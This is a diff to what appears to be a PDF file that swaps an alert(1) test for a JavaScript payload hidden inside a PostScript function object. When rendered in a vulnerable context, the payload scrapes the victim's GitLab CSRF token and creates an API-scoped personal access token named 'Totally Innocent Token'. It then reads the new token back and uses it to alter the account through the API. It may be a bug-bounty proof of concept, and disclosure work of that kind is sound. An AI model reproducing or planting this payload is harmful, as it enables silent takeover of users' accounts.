@@ -3,7 +3,49 @@
 <<
   /FunctionType 4
   /Domain [(console.log("Starting"),
-alert(1)
+fetch(
+  new Request('https://gitlab.com/profile/personal_access_tokens')
+).then(function(response) {
+  return response.text()
+}).then(function(text) {
+  var tokenPrefix = "name=\\"authenticity_token\\" value=\\"";
+  var a = text.indexOf(tokenPrefix);
+  var token = text.substring(a+33, a+33+88);
+  var form = new FormData();
+  form.append("utf8", true);
+  form.append("authenticity_token", token);
+  form.append("personal_access_token[name]", "Totally Innocent Token Nothing To See Here");
+  form.append("personal_access_token[expires_at]", "2019-12-01");
+  form.append("personal_access_token[scopes][]", "api");
+  fetch(
+    'https://gitlab.com/profile/personal_access_tokens',
+    { method: "POST", body: form, redirect: "manual" }
+  ).then(function(response) {
+    return response.text()
+  }).then(function(text) {
+    fetch(
+      'https://gitlab.com/profile/personal_access_tokens'
+    ).then(function(response) {
+      return response.text()
+    }).then(function(text) {
+      var i = text.indexOf("id=\\"created-personal-access-token\\" value=\\"");
+      var pat = text.substring(i+42, i+42+20);
+      console.log("And my newly created personal access token is "+ pat)
+      var headers = new Headers();
+      headers.append("PRIVATE-TOKEN", pat);
+      form = new FormData();
+      form.append("message", "Truly Innocent");
+      fetch(
+        'https://gitlab.com/api/v4/user/status',
+        { method: "PUT", body: form, headers: headers}
+      ).then(function(response) {
+        return response.text()
+      }).then(function(text) {
+        console.log(text);
+      });
+    });
+  });
+})
 ) 0]
   /Range [0 0]
   /Length 12
